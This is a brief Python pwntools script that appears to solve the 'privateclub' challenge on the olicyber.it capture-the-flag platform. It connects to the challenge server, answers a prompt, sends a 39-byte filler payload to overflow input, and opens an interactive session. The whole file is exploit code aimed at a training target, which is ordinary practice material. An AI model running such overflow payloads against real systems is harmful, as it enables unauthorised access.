from pwn import *

r=remote("privateclub.challs.olicyber.it",10015)
r.recvline()
s=b"18"
r.sendline(s)
r.recvuntil(b"chiami?")
payload=b"a"*39
r.sendline(payload)
r.interactive()
